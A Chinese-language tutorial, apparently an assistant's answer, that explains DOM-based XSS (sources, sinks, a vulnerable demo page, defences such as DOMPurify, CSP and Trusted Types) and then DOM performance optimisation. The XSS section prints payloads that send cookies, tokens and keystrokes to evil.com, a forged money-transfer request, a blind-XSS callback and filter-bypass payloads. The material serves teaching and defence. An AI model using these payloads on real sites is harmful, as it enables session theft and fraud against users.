
# 一、DOM 型 XSS 完整利用链

DOM 型 XSS（DOM-based XSS）是最"隐蔽"的一类 XSS，因为**恶意数据从不经过服务器**，传统的服务端防护（WAF、输入过滤）可能完全看不到。

---

## 1.1 三类 XSS 对比

先建立全局认知：

| 类型             | 数据流向                                      | 服务器能看到吗 | 典型场景            |
| ---------------- | --------------------------------------------- | -------------- | ------------------- |
| **存储型** | 攻击者 → 服务器数据库 → 受害者浏览器        | ✅ 能看到      | 评论区、留言板      |
| **反射型** | 攻击者 → URL → 服务器 → 受害者浏览器       | ✅ 能看到      | 搜索框、错误页      |
| **DOM 型** | 攻击者 → URL → **浏览器 JS 直接处理** | ❌ 看不到      | 前端路由、hash 处理 |

**DOM 型 XSS 的核心**：

```
恶意数据 → 浏览器 JS 读取（source）→ 未过滤 → 插入 DOM（sink）→ 执行
```

服务器全程不参与，所以又叫**客户端 XSS**。

---

## 1.2 核心概念：Source 和 Sink

### Source（数据来源）

攻击者能控制的输入点：

| Source                | 说明               | 例子                        |
| --------------------- | ------------------ | --------------------------- |
| `location.hash`     | URL 的 `#` 后面  | `site.com/#<script>`      |
| `location.search`   | URL 的 `?` 后面  | `site.com/?name=<script>` |
| `location.href`     | 完整 URL           |                             |
| `document.URL`      | 当前 URL           |                             |
| `document.referrer` | 来源页             |                             |
| `window.name`       | 窗口名（跨页持久） |                             |
| `postMessage`       | 跨窗口消息         |                             |
| `localStorage`      | 本地存储           |                             |
| `document.cookie`   | Cookie             |                             |

### Sink（危险输出点）

能把数据当代码/HTML 执行的地方：

| Sink                              | 危险等级 | 说明                 |
| --------------------------------- | -------- | -------------------- |
| `innerHTML`                     | 🔴 高    | 解析 HTML            |
| `outerHTML`                     | 🔴 高    | 同上                 |
| `document.write()`              | 🔴 高    | 直接写文档           |
| `eval()`                        | 🔴 高    | 执行 JS              |
| `setTimeout(string)`            | 🔴 高    | 字符串当代码         |
| `setInterval(string)`           | 🔴 高    | 同上                 |
| `Function(string)`              | 🔴 高    | 动态函数             |
| `element.src`                   | 🟡 中    | `javascript:` 协议 |
| `element.href`                  | 🟡 中    | `javascript:` 协议 |
| `location.href`                 | 🟡 中    | 跳转                 |
| `jQuery.html()`                 | 🔴 高    | 同 innerHTML         |
| `React.dangerouslySetInnerHTML` | 🔴 高    | 同 innerHTML         |

**一句话**：

> DOM 型 XSS = **Source 的数据，未净化，流入 Sink**。

---

## 1.3 完整利用链（一步步演示）

### 场景：一个前端搜索功能

**HTML**：

```html
<!DOCTYPE html>
<html>
<body>
  <h1>搜索结果</h1>
  <div id="result"></div>

  <script>
    // 从 URL 读取搜索词
    const keyword = location.hash.slice(1);
    // 直接插入 DOM（危险！）
    document.getElementById('result').innerHTML =
      '你搜索的是：' + keyword;
  </script>
</body>
</html>
```

### 正常访问

```
https://site.com/#hello
```

页面显示：`你搜索的是：hello`

### 攻击步骤

#### 第 1 步：构造 payload

```
https://site.com/#<img src=x onerror=alert(document.cookie)>
```

#### 第 2 步：诱导受害者点击

通过邮件、聊天、短链等方式发送。

#### 第 3 步：浏览器执行

1. 页面加载
2. JS 读取 `location.hash` = `<img src=x onerror=alert(...)>`
3. `innerHTML` 解析，创建 `<img>` 元素
4. `src=x` 加载失败 → 触发 `onerror`
5. 执行 `alert(document.cookie)`

#### 第 4 步：危害升级

弹窗只是验证，真实攻击会：

```js
// 窃取 Cookie
new Image().src = 'https://evil.com/steal?c=' + document.cookie;

// 窃取 localStorage 里的 token
fetch('https://evil.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token: localStorage.getItem('token') })
});

// 冒充用户操作
fetch('/api/transfer', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ to: 'attacker', amount: 10000 })
});

// 键盘记录
document.addEventListener('keypress', e => {
  fetch('https://evil.com/log?k=' + e.key);
});
```

---

## 1.4 为什么 `<script>` 不执行？

很多人疑惑：

```js
document.getElementById('result').innerHTML = '<script>alert(1)</script>';
```

**弹窗不会出现**。

**原因**：HTML5 规范规定，`innerHTML` 插入的 `<script>` **不会被执行**（防止意外执行）。

**但**：其他标签的事件属性会执行：

```html
<img src=x onerror=alert(1)>          ✅ 执行
<svg onload=alert(1)>                 ✅ 执行
<iframe src=javascript:alert(1)>      ✅ 执行
<body onload=alert(1)>                ✅ 执行
<input autofocus onfocus=alert(1)>    ✅ 执行
<details open ontoggle=alert(1)>      ✅ 执行
```

**所以攻击者不用 `<script>`，用事件属性。**

---

## 1.5 常见 Source → Sink 组合

### 组合 1：hash → innerHTML

```js
const name = location.hash.slice(1);
el.innerHTML = name;
```

攻击：`#<img src=x onerror=alert(1)>`

### 组合 2：search → document.write

```js
const q = new URLSearchParams(location.search).get('q');
document.write('<h1>' + q + '</h1>');
```

攻击：`?q=<script>alert(1)</script>`（`document.write` 会执行 script）

### 组合 3：postMessage → eval

```js
window.addEventListener('message', e => {
  eval(e.data);
});
```

攻击：从恶意页面发 `postMessage('alert(1)', '*')`。

### 组合 4：jQuery 选择器注入

```js
$(location.hash);   // 老版本 jQuery 会执行 HTML
```

攻击：`#<img src=x onerror=alert(1)>`

### 组合 5：location.href → javascript:

```js
el.href = location.search.slice(1);
```

攻击：`?javascript:alert(1)`

---

## 1.6 实战：用 DevTools 挖掘 DOM XSS

### 第 1 步：找 Source

在 Console 里搜：

```js
// 找所有读取 location 的地方
// 在 Sources 面板 Ctrl+Shift+F 搜：
location.hash
location.search
document.URL
document.referrer
```

### 第 2 步：找 Sink

搜：

```
innerHTML
outerHTML
document.write
eval(
setTimeout(
insertAdjacentHTML
```

### 第 3 步：追踪数据流

在 Source 读取处打断点，单步执行，看数据流向哪个 Sink。

### 第 4 步：构造 payload

根据上下文构造：

| 上下文         | payload                          |
| -------------- | -------------------------------- |
| 直接插入 HTML  | `<img src=x onerror=alert(1)>` |
| 在属性里       | `" onmouseover="alert(1)`      |
| 在 JS 字符串里 | `'; alert(1); //`              |
| 在 URL 里      | `javascript:alert(1)`          |

### 第 5 步：验证

```
https://site.com/#<img src=x onerror=alert(1)>
```

---

## 1.7 高级技巧

### 1. 绕过简单过滤

```js
// 过滤了 <script>
<img src=x onerror=alert(1)>

// 过滤了 onerror
<svg><animate onbegin=alert(1)>

// 过滤了 alert
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>

// 过滤了括号
<img src=x onerror=alert`1`>

// 过滤了空格
<img/src=x/onerror=alert(1)>
```

### 2. 编码绕过

```html
<!-- HTML 实体 -->
<img src=x onerror=alert(1)>

<!-- Unicode -->
<img src=x onerror=\u0061lert(1)>

<!-- URL 编码（在 href 里） -->
<a href="javascript:%61lert(1)">
```

### 3. DOM Clobbering 配合

```html
<form id="config">
  <input name="url" value="javascript:alert(1)">
</form>
```

如果 JS 里用 `config.url`，会被覆盖。

### 4. 盲打（Blind XSS）

如果 Sink 在后台管理系统（管理员才能看到），用 XSS 平台接收回显：

```js
// 简单版
fetch('https://your-server.com/log?url=' + encodeURIComponent(location.href));

// 用 XSS 平台（如 XSStrike、BeEF）
```

---

## 1.8 防御方案

### 1. 输出编码（最重要）

```js
// ❌ 危险
el.innerHTML = userInput;

// ✅ 安全
el.textContent = userInput;
```

**规则**：

| 上下文    | 编码方式               |
| --------- | ---------------------- |
| HTML 文本 | `&lt; &gt; &amp;`    |
| HTML 属性 | 加引号 + 编码          |
| JS 字符串 | `\x3c` 等            |
| URL       | `encodeURIComponent` |
| CSS       | `\3c` 等             |

### 2. 使用安全 API

```js
// ✅ 安全
el.textContent = data;
el.setAttribute('data-x', data);

// ❌ 危险
el.innerHTML = data;
el.setAttribute('onclick', data);
```

### 3. 使用 DOMPurify 净化

```js
import DOMPurify from 'dompurify';
el.innerHTML = DOMPurify.sanitize(userInput);
```

### 4. Trusted Types（现代方案）

```js
// CSP 里开启
Content-Security-Policy: require-trusted-types-for 'script';

// JS 必须用 Trusted Types
const policy = trustedTypes.createPolicy('default', {
  createHTML: (s) => DOMPurify.sanitize(s),
});
el.innerHTML = policy.createHTML(userInput);
```

### 5. CSP（最后防线）

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

阻止内联脚本执行。

### 6. 避免危险 Sink

```js
// ❌
eval(userInput)
setTimeout(userInput, 1000)
new Function(userInput)

// ✅
setTimeout(() => { /* ... */ }, 1000)
```

---

## 1.9 防御清单

- [ ] 所有用户输入都当"不可信"
- [ ] 优先用 `textContent` 而非 `innerHTML`
- [ ] 必须用 `innerHTML` 时，先 DOMPurify
- [ ] 不用 `eval`、`Function`、`setTimeout(string)`
- [ ] 配置 CSP
- [ ] 开启 Trusted Types
- [ ] Cookie 加 HttpOnly
- [ ] 前端框架别用 `dangerouslySetInnerHTML` / `v-html`

---

# 二、DOM 操作性能优化

DOM 操作慢，因为它是 **JS 引擎 ↔ 渲染引擎** 的桥梁，每次操作可能触发**重排**和**重绘**。

---

## 2.1 浏览器渲染流程

```
JS 修改 DOM
    │
    ▼
样式计算（Style）
    │
    ▼
布局 / 重排（Layout / Reflow）  ← 计算位置尺寸
    │
    ▼
绘制 / 重绘（Paint）            ← 画像素
    │
    ▼
合成（Composite）               ← 图层合并
    │
    ▼
屏幕
```

### 重排（Reflow）

**触发条件**：改变元素的几何属性。

- 改宽高、位置、边距
- 增删元素
- 改字体大小
- 读取某些属性（见下文）

**代价**：高，要重新计算整个或部分布局。

### 重绘（Repaint）

**触发条件**：改变外观但不影响布局。

- 改颜色、背景
- 改 visibility
- 改 box-shadow

**代价**：中，比重排轻。

### 只合成（Composite）

**触发条件**：只改 `transform`、`opacity`。

**代价**：低，GPU 加速，不重排不重绘。

**优先级**：

```
transform/opacity  >  重绘  >  重排
（最快）                      （最慢）
```

---

## 2.2 强制同步布局（Layout Thrashing）

**最隐蔽的性能杀手**。

### 问题代码

```js
for (let i = 0; i < 100; i++) {
  el.style.width = el.offsetWidth + 10 + 'px';   // 读 → 写 → 读 → 写...
}
```

**为什么慢**：

- 写 `style.width` → 标记布局脏
- 读 `offsetWidth` → **强制立即重排**（否则读到旧值）
- 循环 100 次 → 重排 100 次

这叫 **Layout Thrashing（布局抖动）**。

### 触发强制重排的读取属性

```
offsetTop / offsetLeft / offsetWidth / offsetHeight
scrollTop / scrollLeft / scrollWidth / scrollHeight
clientTop / clientLeft / clientWidth / clientHeight
getComputedStyle()
getBoundingClientRect()
```

**规则**：读写分离。

### 优化后

```js
// 先全部读
const widths = [];
for (let i = 0; i < 100; i++) {
  widths.push(el.offsetWidth);
}

// 再全部写
for (let i = 0; i < 100; i++) {
  els[i].style.width = widths[i] + 10 + 'px';
}
```

只重排 1 次。

---

## 2.3 批量操作 DOM

### 方法 1：DocumentFragment

```js
// ❌ 每次 append 都可能触发重排
for (let i = 0; i < 1000; i++) {
  const li = document.createElement('li');
  li.textContent = `项目 ${i}`;
  ul.appendChild(li);   // 1000 次
}

// ✅ 用 Fragment 批量
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  const li = document.createElement('li');
  li.textContent = `项目 ${i}`;
  fragment.appendChild(li);   // 在内存里操作
}
ul.appendChild(fragment);     // 只插入 1 次
```

### 方法 2：先隐藏，操作完再显示

```js
el.style.display = 'none';
// ... 大量操作
el.style.display = 'block';
```

**原理**：`display:none` 的元素不参与布局，操作它不触发重排。

### 方法 3：克隆节点

```js
const clone = ul.cloneNode(true);
// 在 clone 上操作
ul.parentNode.replaceChild(clone, ul);
```

### 方法 4：innerHTML 一次性写入

```js
// ✅ 拼好字符串，一次写入
const html = items.map(i => `<li>${i}</li>`).join('');
ul.innerHTML = html;
```

**注意**：XSS 风险，数据要转义。

---

## 2.4 用 CSS 代替 JS

### 动画用 transform / opacity

```js
// ❌ 触发重排
el.style.left = '100px';

// ✅ 只合成
el.style.transform = 'translateX(100px)';
```

### 用 class 切换代替逐条改样式

```js
// ❌ 多次改样式
el.style.color = 'red';
el.style.background = 'blue';
el.style.padding = '10px';

// ✅ 一次切换 class
el.classList.add('active');
```

### 用 visibility / opacity 代替 display

```js
// ❌ 触发重排
el.style.display = 'none';

// ✅ 只重绘（元素仍在布局里）
el.style.visibility = 'hidden';
```

---

## 2.5 虚拟 DOM（Virtual DOM）

**思想**：在内存里用 JS 对象模拟 DOM，对比差异后只更新变化的部分。

```
真实 DOM（慢）
    ↑
虚拟 DOM（JS 对象，快）
    ↑
状态变化 → 生成新虚拟 DOM → Diff → 批量更新真实 DOM
```

### 简化实现

```js
// 虚拟节点
function h(tag, props, children) {
  return { tag, props, children };
}

// 渲染成真实 DOM
function render(vnode) {
  if (typeof vnode === 'string') {
    return document.createTextNode(vnode);
  }
  const el = document.createElement(vnode.tag);
  for (const key in vnode.props) {
    el.setAttribute(key, vnode.props[key]);
  }
  vnode.children.forEach(child => {
    el.appendChild(render(child));
  });
  return el;
}

// Diff（简化版）
function patch(parent, oldVnode, newVnode, index = 0) {
  // ... 对比并更新
}
```

### React / Vue 的做法

- **React**：JSX → 虚拟 DOM → Fiber → 批量更新
- **Vue**：模板 → 虚拟 DOM → Patch → 异步更新队列

**核心优化**：

- 批量更新（一个事件循环内合并）
- Diff 算法（同层比较，key 优化）
- 异步渲染（React Fiber、Vue nextTick）

---

## 2.6 事件委托

**问题**：给 1000 个列表项各绑事件 = 1000 个监听器。

```js
// ❌ 性能差
items.forEach(item => {
  item.addEventListener('click', handler);
});
```

**优化**：绑在父元素，利用事件冒泡。

```js
// ✅ 只绑 1 个
ul.addEventListener('click', e => {
  if (e.target.tagName === 'LI') {
    handler(e);
  }
});
```

**优点**：

- 减少内存
- 动态添加的子元素自动生效
- 减少绑定开销

---

## 2.7 防抖与节流

### 防抖（Debounce）

**场景**：搜索框输入，停止输入后才请求。

```js
function debounce(fn, delay) {
  let timer;
  return function (...args) {
    clearTimeout(timer);
    timer = setTimeout(() => fn.apply(this, args), delay);
  };
}

input.addEventListener('input', debounce(e => {
  search(e.target.value);
}, 300));
```

### 节流（Throttle）

**场景**：滚动、resize，固定频率执行。

```js
function throttle(fn, interval) {
  let last = 0;
  return function (...args) {
    const now = Date.now();
    if (now - last >= interval) {
      last = now;
      fn.apply(this, args);
    }
  };
}

window.addEventListener('scroll', throttle(() => {
  console.log('滚动位置', window.scrollY);
}, 200));
```

### 用 requestAnimationFrame 优化视觉更新

```js
// ❌ 每次滚动都改
window.addEventListener('scroll', () => {
  el.style.transform = `translateY(${window.scrollY}px)`;
});

// ✅ 用 rAF 对齐帧
let ticking = false;
window.addEventListener('scroll', () => {
  if (!ticking) {
    requestAnimationFrame(() => {
      el.style.transform = `translateY(${window.scrollY}px)`;
      ticking = false;
    });
    ticking = true;
  }
});
```

---

## 2.8 性能优化清单

### 减少重排

- [ ] 读写分离，避免 Layout Thrashing
- [ ] 用 DocumentFragment 批量插入
- [ ] 用 `display:none` 隐藏后操作
- [ ] 用 class 切换代替逐条改样式
- [ ] 动画用 `transform` / `opacity`

### 减少重绘

- [ ] 用 `visibility` 代替 `display`
- [ ] 避免频繁改颜色、背景

### 减少 DOM 操作

- [ ] 缓存查询结果
- [ ] 事件委托
- [ ] 虚拟 DOM
- [ ] 防抖节流

### 利用 GPU

- [ ] `transform: translateZ(0)` 或 `will-change` 提升图层
- [ ] 注意别滥用（图层过多反而慢）

---

## 2.9 用 DevTools 分析性能

### Performance 面板

1. 点录制
2. 操作页面
3. 停止
4. 看火焰图

**关注**：

- 紫色 = 渲染（重排重绘）
- 黄色 = JS 执行
- 红色 = 长任务（>50ms）

### Rendering 面板

`⋮` → More tools → Rendering：

- **Paint flashing**：重绘区域闪绿
- **Layout Shift Regions**：布局偏移高亮
- **Frame Rendering Stats**：实时 FPS

### Performance Monitor

`⋮` → More tools → Performance monitor：

- CPU 使用率
- DOM 节点数
- JS 堆大小
- 布局次数 / 秒

---

## 2.10 实战对比

### 优化前

```js
// 1000 次重排
for (let i = 0; i < 1000; i++) {
  const li = document.createElement('li');
  li.textContent = i;
  ul.appendChild(li);
}
```

### 优化后

```js
// 1 次重排
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  const li = document.createElement('li');
  li.textContent = i;
  fragment.appendChild(li);
}
ul.appendChild(fragment);
```

**用 Performance 面板对比，差距可能几十倍。**

---

# 三、总结

## DOM 型 XSS

```
Source（location.hash 等）
    ↓ 未净化
Sink（innerHTML 等）
    ↓
执行恶意代码
```

**防御**：输出编码、textContent、DOMPurify、CSP、Trusted Types。

## DOM 性能

```
重排 > 重绘 > 合成
（慢）        （快）
```

**优化**：读写分离、批量操作、虚拟 DOM、事件委托、防抖节流、transform 动画。

---

# 四、学习建议

1. **XSS**：

   - 在 PortSwigger Academy 做 DOM XSS 实验
   - 用 DVWA 练习
   - 读 OWASP DOM XSS 指南
2. **性能**：

   - 用 Performance 面板录制真实页面
   - 手动制造 Layout Thrashing，观察差异
   - 读《高性能 JavaScript》
3. **结合**：

   - 写一个前端页面，故意用 `innerHTML` 接收 URL 参数 → 复现 XSS
   - 然后改成安全写法 → 对比

---

需要我继续深入哪一块？比如：

- **DOM Clobbering 完整利用**
- **CSP 绕过技巧**
- **虚拟 DOM Diff 算法详解**
- **用 Performance 面板做一次完整性能调优**
